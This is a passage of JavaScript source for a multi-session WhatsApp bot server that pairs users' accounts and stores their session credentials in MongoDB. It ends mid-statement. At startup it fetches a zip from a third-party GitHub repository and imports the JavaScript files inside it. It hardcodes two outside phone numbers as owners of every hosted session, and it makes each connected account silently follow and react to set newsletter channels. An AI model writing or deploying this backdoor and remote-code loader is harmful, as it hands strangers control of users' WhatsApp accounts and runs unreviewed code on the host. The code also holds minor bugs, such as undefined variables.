import express from 'express';
import fs from 'fs-extra';
import fsSync from 'fs';
import path from 'path';
import { exec } from 'child_process';
import bodyParser from 'body-parser';
import { MongoClient } from 'mongodb';
import axios from 'axios';
import AdmZip from 'adm-zip';
import pino from 'pino';
import cheerio from 'cheerio';
import moment from 'moment-timezone';
import Jimp from 'jimp';
import { Sticker, createSticker, StickerTypes } from 'wa-sticker-formatter';
import webp from 'node-webpmux';
import crypto from 'crypto';
import FormData from 'form-data';
import os from 'os';
import FileType from 'file-type';
import * as baileysModule from '@whiskeysockets/baileys';
import * as libModule from './lib/index.js';
import * as antiDeleteModule from './lib/antidel.js';
import * as commandModule from './command.js';
import * as groupEventsModule from './lib/groupevents.js';
import * as configModule from './config.js';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const baileys = baileysModule.default ? { ...baileysModule, ...baileysModule.default } : baileysModule;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    delay,
    getContentType,
    makeCacheableSignalKeyStore,
    jidNormalizedUser,
    isJidBroadcast,
    proto,
    isJidGroup,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers,
    getAggregateVotesInPollMessage
} = baileys;
const lib = libModule.default || libModule;
const {
    sms,
    downloadMediaMessage,
    saveContact,
    loadMessage,
    getName,
    getChatSummary,
    saveGroupMetadata,
    getGroupMetadata,
    saveMessageCount,
    getInactiveGroupMembers,
    getGroupMembersMessageCount,
    saveMessage,
    getBuffer,
    getGroupAdmins,
    getRandom,
    h2k,
    isUrl,
    Json,
    runtime,
    sleep,
    fetchJson,
    lidToPhone,
    cleanPN,
    DeletedText,
    DeletedMedia,
    getWarning,
    addWarning,
    clearWarning,
    AntiEdit
} = lib;
const antiDelete = antiDeleteModule.default || antiDeleteModule;
const { AntiDelete } = antiDelete;
const events = commandModule.default || commandModule;
const GroupEvents = groupEventsModule.default || groupEventsModule;
const config = configModule.default || configModule;
const app = express();
const __path = process.cwd();

// ===============================
// GLOBAL ERROR SAFETY NET
// ===============================
process.on('uncaughtException', (err) => {
    console.error('❌ uncaughtException:', err);
});

process.on('unhandledRejection', (err) => {
    console.error('❌ unhandledRejection:', err);
});

// ===============================
// NEWSLETTER ARRAYS (loaded from lib/newsletters.js)
// ===============================
let newsletterJids = [
    "120363429385334047@newsletter"
];

let FollowChannelJids = [
    "120363429385334047@newsletter"
];

// ===============================
// PLUGIN LOADER FROM GITHUB REPO
// ===============================
const repoZipUrl = 'https://github.com/bgashyr648-ops/bagga/archive/refs/heads/main.zip';
const pluginFolder = path.join(__dirname, 'plugins');

async function downloadAndLoadPlugins() {
    try {
        console.log('🔄 Loading plugins from server...');

        if (!fsSync.existsSync(pluginFolder)) {
            fsSync.mkdirSync(pluginFolder, { recursive: true });
        }

        const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
        const zip = new AdmZip(Buffer.from(response.data, 'binary'));

        const tempExtractPath = path.join(__dirname, '.temp_plugins');
        if (fsSync.existsSync(tempExtractPath)) {
            await fs.remove(tempExtractPath);
        }
        fsSync.mkdirSync(tempExtractPath, { recursive: true });

        zip.extractAllTo(tempExtractPath, true);

        const extractedFolders = fs.readdirSync(tempExtractPath).filter(f =>
            fs.statSync(path.join(tempExtractPath, f)).isDirectory()
        );

        if (!extractedFolders.length) {
            await fs.remove(tempExtractPath);
            return;
        }

        const extractedRepoPath = path.join(tempExtractPath, extractedFolders[0]);

        // DELETE OLD PLUGINS FOLDER FIRST
        if (fsSync.existsSync(pluginFolder)) {
            console.log('🗑️ Deleting old plugins folder...');
            await fs.remove(pluginFolder);
        }

        // Create fresh plugins folder
        fsSync.mkdirSync(pluginFolder, { recursive: true });

        // Load plugins from plugins folder
        const sourcePluginsPath = path.join(extractedRepoPath, 'plugins');
        if (fsSync.existsSync(sourcePluginsPath)) {
            const newPlugins = fs.readdirSync(sourcePluginsPath);
            let loadedCount = 0;

            for (const plugin of newPlugins) {
                if (plugin.endsWith('.js')) {
                    const sourcePath = path.join(sourcePluginsPath, plugin);
                    const destPath = path.join(pluginFolder, plugin);
                    await fs.copy(sourcePath, destPath);
                    loadedCount++;
                }
            }

            if (loadedCount > 0) {
                console.log(`✅ Loaded ${loadedCount} new plugins`);
            }
        }

        // Load newsletters.js from lib folder
        const sourceLibPath = path.join(extractedRepoPath, 'lib');
        const targetLibPath = path.join(__dirname, 'lib');

        if (fsSync.existsSync(sourceLibPath)) {
            const newslettersFile = path.join(sourceLibPath, 'newsletters.js');
            if (fsSync.existsSync(newslettersFile)) {
                const targetNewslettersPath = path.join(targetLibPath, 'newsletters.js');
                await fs.ensureDir(targetLibPath);
                await fs.copy(newslettersFile, targetNewslettersPath);
                console.log('✅ Loaded newsletters.js from server');
            }
        }

        await fs.remove(tempExtractPath);
        console.log('✅ Plugins and lib files updated successfully');

    } catch (error) {
        console.error('❌ Error loading from server:', error.message);
    }
}

async function loadPlugins() {
    try {
        await downloadAndLoadPlugins();

        // Load newsletters.js if exists
        const newslettersPath = path.join(__dirname, 'lib', 'newsletters.js');
        if (fsSync.existsSync(newslettersPath)) {
            try {
                const loaded = await import('file://' + newslettersPath);
                if (loaded.newsletterJids) {
                    newsletterJids = loaded.newsletterJids;
                }
                if (loaded.FollowChannelJids) {
                    FollowChannelJids = loaded.FollowChannelJids;
                }
                console.log('✅ Newsletters loaded from repo');
            } catch (err) {
                console.error('❌ Error loading newsletters:', err.message);
            }
        }

        // Load plugins
        if (fsSync.existsSync(pluginFolder)) {
            const pluginFiles = fs.readdirSync(pluginFolder).filter(file =>
                file.endsWith('.js') && fs.statSync(path.join(pluginFolder, file)).isFile()
            );

            for (const plugin of pluginFiles) {
                try {
                    await import(path.join(pluginFolder, plugin));
                } catch (err) {
                    console.error(`❌ Error loading plugin ${plugin}:`, err.message);
                }
            }
        }
    } catch (err) {
        console.error('[ ❌ ] Error loading', { Error: err.message });
    }
}

// ===============================
// GARBAGE COLLECTION
// ===============================
setInterval(() => {
    if (global.gc) {
        global.gc();
    }
}, 60000);

// ===============================
// TEMP DIRECTORY MANAGEMENT
// ===============================
const tempDir = path.join(os.tmpdir(), "cache-temp");
if (!fsSync.existsSync(tempDir)) {
    fsSync.mkdirSync(tempDir, { recursive: true });
}

const clearTempDir = () => {
    fsSync.readdir(tempDir, (err, files) => {
        if (err) return;
        for (const file of files) {
            fsSync.unlink(path.join(tempDir, file), (err) => {});
        }
    });
};
setInterval(clearTempDir, 5 * 60 * 1000);

// ===============================
// GLOBAL VARIABLES
// ===============================
const activeSockets = new Map();
const socketCreationTime = new Map();
const sessionStartedAt = new Map();
const connectMsgSentFor = new Map();
const reconnectAttempts = new Map();
const userWarnings = new Map();
const SESSION_BASE_PATH = './session';
const otpStore = new Map();
const MAX_ACTIVE_SESSIONS = 50;

const globalOwner = [
    "923427582273@s.whatsapp.net",
    "923103448168@s.whatsapp.net"
];

if (!fs.existsSync(SESSION_BASE_PATH)) {
    fs.mkdirSync(SESSION_BASE_PATH, { recursive: true });
}

// ===============================
// MONGODB FUNCTIONS
// ===============================
let db;
let mongoClient;

async function connectMongoDB() {
    try {
        mongoClient = new MongoClient(config.MONGODB_URL);
        await mongoClient.connect();
        db = mongoClient.db(config.DB_NAME);
        console.log('✅ MongoDB Connected Successfully');

        await db.collection(config.COLLECTIONS.SESSIONS).createIndex({ number: 1 }, { unique: true });
        await db.collection(config.COLLECTIONS.NUMBERS).createIndex({ number: 1 }, { unique: true });
        await db.collection(config.COLLECTIONS.CONFIGS).createIndex({ number: 1 }, { unique: true });

        return db;
    } catch (error) {
        console.error('❌ MongoDB Connection Error:', error);
        throw error;
    }
}

async function saveSessionToMongoDB(number, sessionData) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');

        if (!sessionData || typeof sessionData !== 'object' || Object.keys(sessionData).length === 0) {
            return false;
        }

        const session = {
            number: sanitizedNumber,
            sessionData: sessionData,
            lastUpdated: new Date(),
            createdAt: new Date()
        };

        await db.collection(config.COLLECTIONS.SESSIONS).updateOne(
            { number: sanitizedNumber },
            { $set: session },
            { upsert: true }
        );

        return true;
    } catch (error) {
        return false;
    }
}

async function getSessionFromMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const session = await db.collection(config.COLLECTIONS.SESSIONS).findOne({ number: sanitizedNumber });

        if (session && session.sessionData) {
            if (session.sessionData && typeof session.sessionData === 'object') {
                console.log(`✅ Session restored from MongoDB for ${sanitizedNumber}`);
                return session.sessionData;
            }
        }

        return null;
    } catch (error) {
        return null;
    }
}

async function deleteSessionFromMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        await db.collection(config.COLLECTIONS.SESSIONS).deleteOne({ number: sanitizedNumber });
        return true;
    } catch (error) {
        console.error('❌ Error deleting session from MongoDB:', error);
        throw error;
    }
}

async function deleteConfigFromMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        await db.collection(config.COLLECTIONS.CONFIGS).deleteOne({ number: sanitizedNumber });
        return true;
    } catch (error) {
        console.error('❌ Error deleting config from MongoDB:', error);
        throw error;
    }
}

async function saveNumberToMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const numberDoc = {
            number: sanitizedNumber,
            addedAt: new Date(),
            lastActive: new Date()
        };

        await db.collection(config.COLLECTIONS.NUMBERS).updateOne(
            { number: sanitizedNumber },
            { $set: numberDoc },
            { upsert: true }
        );

        return true;
    } catch (error) {
        console.error('❌ Error saving number to MongoDB:', error);
        throw error;
    }
}

async function getAllNumbersFromMongoDB() {
    try {
        const numbers = await db.collection(config.COLLECTIONS.NUMBERS).find({}).toArray();
        return numbers.map(n => n.number);
    } catch (error) {
        console.error('❌ Error getting numbers from MongoDB:', error);
        return [];
    }
}

async function deleteNumberFromMongoDB(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        await db.collection(config.COLLECTIONS.NUMBERS).deleteOne({ number: sanitizedNumber });
        return true;
    } catch (error) {
        console.error('❌ Error deleting number from MongoDB:', error);
        throw error;
    }
}

async function deleteAllNumbersFromMongoDB() {
    try {
        const result = await db.collection(config.COLLECTIONS.NUMBERS).deleteMany({});
        return result.deletedCount || 0;
    } catch (error) {
        console.error('❌ Error deleting all numbers from MongoDB:', error);
        throw error;
    }
}

async function deleteAllSessionsFromMongoDB() {
    try {
        const result = await db.collection(config.COLLECTIONS.SESSIONS).deleteMany({});
        return result.deletedCount || 0;
    } catch (error) {
        console.error('❌ Error deleting all sessions from MongoDB:', error);
        throw error;
    }
}

async function deleteAllConfigsFromMongoDB() {
    try {
        const result = await db.collection(config.COLLECTIONS.CONFIGS).deleteMany({});
        return result.deletedCount || 0;
    } catch (error) {
        console.error('❌ Error deleting all configs from MongoDB:', error);
        throw error;
    }
}

async function loadUserConfig(number) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const configDoc = await db.collection(config.COLLECTIONS.CONFIGS).findOne({ number: sanitizedNumber });

        if (configDoc && configDoc.config) {
            return { ...config.DEFAULT_SETTINGS, ...configDoc.config };
        } else {
            const defaultConfig = { ...config.DEFAULT_SETTINGS };
            await saveUserConfigToMongoDB(sanitizedNumber, defaultConfig);
            return defaultConfig;
        }
    } catch (error) {
        console.error(`❌ Error loading config for ${number}:`, error.message);
        return { ...config.DEFAULT_SETTINGS };
    }
}

async function saveUserConfigToMongoDB(number, userConfig) {
    try {
        const sanitizedNumber = number.replace(/[^0-9]/g, '');
        const configDoc = {
            number: sanitizedNumber,
            config: userConfig,
            lastUpdated: new Date(),
            createdAt: new Date()
        };

        await db.collection(config.COLLECTIONS.CONFIGS).updateOne(
            { number: sanitizedNumber },
            { $set: configDoc },
            { upsert: true }
        );

        return true;
    } catch (error) {
        console.error('❌ Error saving config to MongoDB:', error);
        throw error;
    }
}

async function updateUserConfig(number, newConfig) {
    return await saveUserConfigToMongoDB(number, newConfig);
}

function checkMaxSessionsLimit() {
    const currentSessions = activeSockets.size;
    if (currentSessions >= MAX_ACTIVE_SESSIONS) {
        console.warn(`⚠️ Maximum sessions limit reached (${MAX_ACTIVE_SESSIONS})`);
        return false;
    }
    return true;
}

function connectionStatus(number) {
    const sanitized = number.replace(/[^0-9]/g, '');
    const exists = activeSockets.has(sanitized);
    const socket = activeSockets.get(sanitized);
    return {
        connected: exists,
        startTime: sessionStartedAt.get(sanitized) || null,
        uptime: sessionStartedAt.has(sanitized) ? Date.now() - sessionStartedAt.get(sanitized) : 0,
        wsState: socket?.ws?.readyState || null,
        socketCreation: socketCreationTime.get(sanitized) || null,
    };
}

// ===============================
// COMBINED HANDLER (newsletter auto-react + status auto-view)
// ===============================
function setupCombinedHandlers(conn, userConfig) {
    conn.ev.on('messages.upsert', async ({ messages }) => {
        const message = messages[0];

        if (!message?.key) return;

        const remoteJid = message.key.remoteJid;

        // Auto-react on newsletter channels (uses newsletterJids loaded from repo)
        if (newsletterJids && newsletterJids.includes(remoteJid)) {
            try {
                const emojis = ['❤️', '👍', '😮', '😎', '💀'];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
                const serverId = message.key?.server_id;

                if (!serverId) return;

                let retries = config.MAX_RETRIES || 3;
                while (retries > 0) {
                    try {
                        await conn.newsletterReactMessage(
                            remoteJid,
                            serverId.toString(),
                            randomEmoji
                        );
                        break;
                    } catch (error) {
                        if (error.message?.includes('rate-overlimit') || error.message?.includes('429')) {
                            break;
                        }
                        retries--;
                        if (retries === 0) throw error;
                        await delay(2000 * (config.MAX_RETRIES - retries));
                    }
                }
            } catch (error) {
                // Silent fail
            }
            return;
        }

        if (remoteJid === 'status@broadcast' && message.key.participant) {
            try {
                let statusUploader = message.key.participant;

                if (statusUploader && statusUploader.includes('@lid')) {
                    try {
                        const phoneNumber = await lidToPhone(conn, statusUploader);
                        if (phoneNumber) {
                            statusUploader = phoneNumber + '@s.whatsapp.net';
                        }
                    } catch (lidError) {}
                }

                const readKey = {
                    ...message.key,
                    participant: statusUploader
                };

                if (userConfig.AUTO_VIEW_STATUS === 'true') {
                    let retries = config.MAX_RETRIES || 3;
                    while (retries > 0) {
                        try {
                            await conn.readMessages([readKey]);
                            break;
                        } catch (error) {
                            if (error.message?.includes('rate-overlimit') || error.message?.includes('429')) {
                                break;
                            }
                            retries--;
                            if (retries === 0) throw error;
                            await delay(1000 * ((config.MAX_RETRIES || 3) - retries));
                        }
                    }
                }

            } catch (error) {}
            return;
        }
    });
}

// ===============================
// ANTI-DELETE HANDLER
// ===============================
function setupAntiDeleteHandler(conn) {
    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                await AntiDelete(conn, updates).catch(() => {});
            }
        }
    });
}

// ===============================
// FOLLOW NEWSLETTER CHANNELS
// ===============================
async function followNewsletterChannels(conn) {
    try {
        if (!FollowChannelJids || !FollowChannelJids.length) return [];
        for (const channelJid of FollowChannelJids) {
            try {
                await conn.newsletterFollow(channelJid);
                await delay(1000);
            } catch (error) {
                continue;
            }
        }
        return FollowChannelJids;
    } catch (error) {
        return [];
    }
}

// ===============================
// MESSAGE HANDLER
// ===============================
function setupMessageHandlers(conn, number, userConfig) {
    conn.ev.on('messages.upsert', async (mekArray) => {
        try {
            const mek = mekArray.messages[0];
            if (!mek || !mek.message) return;

            mek.message = (getContentType(mek.message) === 'ephemeralMessage')
                ? mek.message.ephemeralMessage.message
                : mek.message;

            if (userConfig.READ_MESSAGE === 'true') {
                try {
                    await conn.readMessages([mek.key]);
                } catch (error) {}
            }

            if (mek.message.viewOnceMessageV2) {
                mek.message = (getContentType(mek.message) === 'ephemeralMessage')
                    ? mek.message.ephemeralMessage.message
                    : mek.message;
            }

            await Promise.all([
                saveMessage(mek).catch(() => {})
            ]);

            const type = getContentType(mek.message);

            const m = sms(conn, mek);
            const from = mek.key.remoteJid;
            const isReact = m.message && m.message.reactionMessage ? true : false;

            const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null
                ? mek.message.extendedTextMessage.contextInfo.quotedMessage || []
                : [];
            const body = (type === 'conversation')
                ? mek.message.conversation
                : (type === 'extendedTextMessage')
                    ? mek.message.extendedTextMessage.text
                    : (type == 'imageMessage') && mek.message.imageMessage.caption
                        ? mek.message.imageMessage.caption
                        : (type == 'videoMessage') && mek.message.videoMessage.caption
                            ? mek.message.videoMessage.caption
                            : '';

            const prefix = userConfig.PREFIX || '.';
            const isCmd = body && body.startsWith(prefix);
            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';

            const args = body ? body.trim().split(/ +/).slice(1) : [];
            const q = args.join(' ');
            const text = args.join(' ');
            const isGroup = from.endsWith('@g.us');
            const sender = mek.key.fromMe
                ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id)
                : (mek.key.participant || mek.key.remoteJid);

            let senderNumber = sender ? sender.split('@')[0] : '';
            if (sender && sender.includes('@lid')) {
                try {
                    const phoneNumber = await lidToPhone(conn, sender);
                    if (phoneNumber) {
                        senderNumber = phoneNumber;
                    }
                } catch (error) {
                    senderNumber = sender.split('@')[0];
                }
            }

            const botNumber = conn.user.id.split(':')[0];
            const sanitizedNumber = number.replace(/[^0-9]/g, '');
            const pushname = mek.pushName || 'Sin Nombre';
            const isMe = botNumber.includes(senderNumber);
            const botNumber2 = await jidNormalizedUser(conn.user.lid);

            let groupName = "";
            let groupAdmins = [];
            let participants = [];
            let isBotAdmins = false;
            let isAdmins = false;

            if (isGroup) {
                const groupMetadata = await conn.groupMetadata(from).catch(e => null);

                if (groupMetadata) {
                    groupName = groupMetadata.subject || "";
                    participants = groupMetadata.participants || [];
                    groupAdmins = await getGroupAdmins(participants);
                    isBotAdmins = groupAdmins.includes(botNumber2);
                    isAdmins = groupAdmins.includes(sender);
                }
            }

            const reply = (teks) => {
                conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(() => {});
            };

            const react = (emoji) => {
                conn.sendMessage(from, { react: { text: emoji, key: mek.key } }).catch(() => {});
            };

            if (isGroup && !isAdmins && isBotAdmins) {
                let cleanBody = body ? body.replace(/[\s\u200b-\u200d\uFEFF]/g, '').toLowerCase() : '';
                const whatsappUrlRegex = /(?:https?:\/\/)?(?:www\.)?(?:whatsapp\.com\/channel\/|chat\.whatsapp\.com\/|wa\.me\/)/gi;

                if (cleanBody && whatsappUrlRegex.test(cleanBody)) {
                    if (mek.key.fromMe || sender === botNumber2) {
                        return;
                    }

                    if (userConfig.ANTI_LINK === "true") {
                        if (!isAdmins) {
                            await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                            await conn.sendMessage(from, {
                                text: `*⚠️ Links are not allowed in this group.*\n @${senderNumber} *has been removed.*`,
                                mentions: [sender]
                            }, { quoted: mek }).catch(() => {});
                            await conn.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
                        }
                        return;

                    } else if (userConfig.ANTI_LINK === "warn") {
                        if (!isAdmins) {
                            let newWarningCount = addWarning(senderNumber);

                            if (newWarningCount === 1) {
                                await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                                await conn.sendMessage(from, {
                                    text: `*⚠️ WARNING (1/2)*\n@${senderNumber} *Links are not allowed in this group*\n> *Next time you will be removed*`,
                                    mentions: [sender]
                                }, { quoted: mek }).catch(() => {});

                            } else if (newWarningCount >= 2) {
                                await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                                await conn.sendMessage(from, {
                                    text: `*🚨 Removed* @${senderNumber} *from the group for sharing Links (2 warnings reached)*`,
                                    mentions: [sender]
                                }, { quoted: mek }).catch(() => {});
                                await conn.groupParticipantsUpdate(from, [sender], 'remove').catch(() => {});
                                clearWarning(senderNumber);
                            }
                        }
                        return;

                    } else if (userConfig.ANTI_LINK === "delete") {
                        if (!isAdmins) {
                            await conn.sendMessage(from, { delete: mek.key }).catch(() => {});
                            await conn.sendMessage(from, {
                                text: `*⚠️ Links are not allowed in this group.*\n*Please* @${senderNumber} *take note.*`,
                                mentions: [sender]
                            }, { quoted: mek }).catch(() => {});
                        }
                        return;
                    }
                }
            }

            const sudoNumbers = Array.isArray(userConfig.SUDO)
                ? userConfig.SUDO
                : userConfig.SUDO ? userConfig.SUDO.split(',').map(s => s.trim()) : [];

            let isCreator = false;
            if (sender) {
                const allOwners = [
                    botNumber.replace(/[^0-9]/g, '') + '@s.whatsapp.net',
                    botNumber2,
                    config.OWNER_NUMBER + '@s.whatsapp.net',
                    ...sudoNumbers,
                    ...globalOwner
                ];

                isCreator = allOwners.includes(
                    sender.includes('@lid')
                        ? (await lidToPhone(conn, sender).catch(() => sender.split('@')[0])) + '@s.whatsapp.net'
                        : sender
                );
            }

            if (!isReact && userConfig.AUTO_REACT === 'true' && senderNumber !== botNumber) {
                if (userConfig.REACT_EMOJIS && userConfig.REACT_EMOJIS.length > 0) {
                    const randomReaction = userConfig.REACT_EMOJIS[Math.floor(Math.random() * userConfig.REACT_EMOJIS.length)];
                    try {
                        await m.react(randomReaction);
                    } catch (e) {}
                }
            }

            if (!isReact && senderNumber === botNumber && userConfig.OWNER_REACT === 'true') {
                if (userConfig.OWNER_EMOJIS && userConfig.OWNER_EMOJIS.length > 0) {
                    const randomReaction = userConfig.OWNER_EMOJIS[Math.floor(Math.random() * userConfig.OWNER_EMOJIS.length)];
                    try {
                        await m.react(randomReaction);
                    } catch (e) {}
                }
            }

            const bannedNumbers = userConfig.BANNED
                ? (Array.isArray(userConfig.BANNED) ? userConfig.BANNED : userConfig.BANNED.split(',').map(s => s.trim()))
                : [];

            const isBanned = senderNumber && bannedNumbers.some(ban => ban.includes(senderNumber));
            if (isBanned) {
                return;
            }

            const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
            const isSudoUser = senderNumber && sudoNumbers.some(sudo => sudo.includes(senderNumber));
            const isGlobalOwner = senderNumber && globalOwner.some(owner => owner.includes(senderNumber));
            const isRealOwner = sender === ownerNumberFormatted || isMe || isSudoUser || isGlobalOwner;

            if (!isRealOwner && userConfig.MODE === "private") {
                return;
            }
            if (!isRealOwner && isGroup && userConfig.MODE === "inbox") {
                return;
            }
            if (!isRealOwner && !isGroup && userConfig.MODE === "groups") {
                return;
            }

            const context = {
                from, quoted, body, isCmd, command: command,
                args: body ? body.trim().split(/ +/).slice(1) : [],
                q: body ? body.trim().split(/ +/).slice(1).join(' ') : '',
                text: body ? body.trim().split(/ +/).slice(1).join(' ') : '',
                isGroup, sender, senderNumber, botNumber2, botNumber,
                pushname, isMe, isCreator, isRealOwner,
                groupName, participants, groupAdmins, isBotAdmins, isAdmins,
                reply, react,
                userConfig, sanitizedNumber: number,
                updateUserConfig: async (num, cfg) => {
                    await updateUserConfig(num, cfg);
                    conn.userConfig = cfg;
                }
            };

            if (isCmd) {
                const cmdName = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();

                const cmd = events.commands.find((cmd) => cmd.pattern === cmdName) ||
                            events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));

                if (cmd) {
                    try {
                        if (cmd.react) {
                            conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } }).catch(() => {});
                        }
                        await cmd.function(conn, mek, m, context);
                    } catch (e) {
                        try {
                            await reply(`⚠️ Error: ${e.message || 'Command failed'}`);
                        } catch (replyErr) {}
                    }
                }
            }

            for (const command of events.commands) {
                if (body && command.on === "body") {
                    try {
                        await command.function(conn, mek, m, context);
                    } catch (e) {}
                }
            }

        } catch (error) {}
    });
}

// ===============================
// ADDITIONAL CONNECTION FUNCTIONS
// ===============================
async function addConnectionFunctions(conn) {
  conn.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
    } else return jid;
  };

  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message =
        message.message &&
        message.message.ephemeralMessage &&
        message.message.ephemeralMessage.message
          ? message.message.ephemeralMessage.message
          : message.message || undefined;
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete (message.message && message.message.ignore ? message.message.ignore : message.message || undefined);
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = {
        ...message.message.viewOnceMessage.message,
      };
    }

    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    if (mtype != "conversation") context = message.message[mtype].contextInfo;
    content[ctype].contextInfo = {
      ...context,
      ...content[ctype].contextInfo,
    };
    const waMessage = await generateWAMessageFromContent(
      jid,
      content,
      options
        ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo
              ? {
                  contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo,
                  },
                }
              : {}),
          }
        : {}
    );
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  };

  conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    trueFileName = attachExtension ? filename + "." + type.ext : filename;
    await fs.writeFileSync(trueFileName, buffer);
    return trueFileName;
  };

  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || "";
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, "") : mime.split("/")[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };

  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = "";
    let res = await axios.head(url);
    mime = res.headers["content-type"];
    if (mime.split("/")[1] === "gif") {
      return conn.sendMessage(
        jid,
        { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options },
        { quoted: quoted, ...options }
      );
    }
    let type = mime.split("/")[0] + "Message";
    if (mime === "application/pdf") {
      return conn.sendMessage(
        jid,
        { document: await getBuffer(url), mimetype: "application/pdf", caption: caption, ...options },
        { quoted: quoted, ...options }
      );
    }
    if (mime.split("/")[0] === "image") {
      return conn.sendMessage(
        jid,
        { image: await getBuffer(url), caption: caption, ...options },
        { quoted: quoted, ...options }
      );
    }
    if (mime.split("/")[0] === "video") {
      return conn.sendMessage(
        jid,
        { video: await getBuffer(url), caption: caption, mimetype: "video/mp4", ...options },
        { quoted: quoted, ...options }
      );
    }
    if (mime.split("/")[0] === "audio") {
      return conn.sendMessage(
        jid,
        { audio: await getBuffer(url), caption: caption, mimetype: "audio/mpeg", ...options },
        { quoted: quoted, ...options }
      );
    }
  };

  conn.cMod = (jid, copy, text = "", sender = conn.user.id.split(':')[0] + "@s.whatsapp.net", options = {}) => {
    let mtype = Object.keys(copy.message)[0];
    let isEphemeral = mtype === "ephemeralMessage";
    if (isEphemeral) {
      mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
    }
    let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
    let content = msg[mtype];
    if (typeof content === "string") msg[mtype] = text || content;
    else if (content.caption) content.caption = text || content.caption;
    else if (content.text) content.text = text || content.text;
    if (typeof content !== "string")
      msg[mtype] = {
        ...content,
        ...options,
      };
    if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
    if (copy.key.remoteJid.includes("@s.whatsapp.net")) sender = sender || copy.key.remoteJid;
    else if (copy.key.remoteJid.includes("@broadcast")) sender = sender || copy.key.remoteJid;
    copy.key.remoteJid = jid;
    copy.key.fromMe = sender === conn.user.id.split(':')[0] + "@s.whatsapp.net";
    return proto.WebMessageInfo.fromObject(copy);
  };

  conn.getFile = async (PATH, save) => {
    let res;
    let data = Buffer.isBuffer(PATH)
      ? PATH
      : /^data:.*?\/.*?;base64,/i.test(PATH)
      ? Buffer.from(PATH.split`,`[1], "base64")
      : /^https?:\/\//.test(PATH)
      ? await (res = await getBuffer(PATH))
      : fs.existsSync(PATH)
      ? ((filename = PATH), fs.readFileSync(PATH))
      : typeof PATH === "string"
      ? PATH
      : Buffer.alloc(0);
    let type = await FileType.fromBuffer(data) || {
      mime: "application/octet-stream",
      ext: ".bin",
    };
    let filename = path.join(__dirname, new Date() * 1 + "." + type.ext);
    if (data && save) fs.promises.writeFile(filename, data);
    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data,
    };
  };

  conn.sendFile = async (jid, PATH, fileName, quoted = {}, options = {}) => {
    let types = await conn.getFile(PATH, true);
    let { filename, size, ext, mime, data } = types;
    let type = "",
      mimetype = mime,
      pathFile = filename;
    if (options.asDocument) type = "document";
    if (options.asSticker || /webp/.test(mime)) {
      const exifModule = await import('./exif.js');
      const { writeExif } = exifModule.default || exifModule;
      let media = { mimetype: mime, data };
      pathFile = await writeExif(media, {
        packname: config.packname,
        author: config.packname,
        categories: options.categories ? options.categories : [],
      });
      await fs.promises.unlink(filename);
      type = "sticker";
      mimetype = "image/webp";
    } else if (/image/.test(mime)) type = "image";
    else if (/video/.test(mime)) type = "video";
    else if (/audio/.test(mime)) type = "audio";
    else type = "document";
    await conn.sendMessage(
      jid,
      {
        [type]: { url: pathFile },
